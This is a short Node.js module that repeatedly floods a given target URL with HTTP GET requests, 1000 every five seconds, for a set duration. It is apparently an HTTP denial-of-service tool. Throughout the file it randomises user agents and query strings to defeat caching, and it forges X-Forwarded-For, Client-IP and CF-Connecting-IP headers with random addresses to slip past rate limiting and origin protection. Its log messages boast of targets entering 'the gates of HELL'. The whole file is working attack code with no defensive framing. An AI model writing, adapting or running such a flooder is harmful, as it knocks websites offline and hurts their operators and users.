const https = require("https");
const http = require("http");
const { URL } = require("url");

const userAgents = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
  "Mozilla/5.0 (Linux; Android 11; SM-G991B)",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X)"
];

function randomIP() {
  return Array(4).fill(0).map(() => Math.floor(Math.random() * 256)).join(".");
}

function randomQuery() {
  const params = [];
  for (let i = 0; i < 5; i++) {
    const key = Math.random().toString(36).substring(2, 5);
    const value = Math.random().toString(36).substring(2, 8);
    params.push(`${key}=${value}`);
  }
  return params.join("&");
}

function randomHeaders(hostname) {
  const ip = randomIP();
  return {
    "User-Agent": userAgents[Math.floor(Math.random() * userAgents.length)],
    "X-Forwarded-For": ip,
    "Client-IP": ip,
    "CF-Connecting-IP": ip,
    "Referer": `https://${hostname}/search?q=${Math.random().toString(36).substring(2)}`,
    "Accept": "*/*",
    "Connection": "keep-alive",
    "Cache-Control": "no-cache",
    "Accept-Language": "en-US,en;q=0.9"
  };
}

module.exports = function(target, duration) {
  const url = new URL(target);
  const client = url.protocol === "https:" ? https : http;
  const end = Date.now() + duration * 1000;

  function send() {
    const path = url.pathname + url.search + "?" + randomQuery();

    const options = {
      method: "GET",
      hostname: url.hostname,
      path,
      port: url.port || (url.protocol === "https:" ? 443 : 80),
      headers: randomHeaders(url.hostname)
    };

    const req = client.request(options, res => {
      if (res.statusCode >= 200 && res.statusCode < 300) {
        console.log(`🔥 [${url.hostname}${options.path}] has entered the gates of HELL`);
      } else {
        console.log(`🛡️ [${url.hostname}${options.path}] blocked with status ${res.statusCode}`);
      }

      res.on("data", () => {}); // Optional
    });

    req.on("error", () => {
      console.log(`❌ [${url.hostname}${options.path}] failed to connect or resisted the flames...`);
    });

    req.end();
  }

  function loop() {
    if (Date.now() >= end) return;
    for (let i = 0; i < 1000; i++) send();
    setTimeout(loop, 5000);
  }

  loop();
};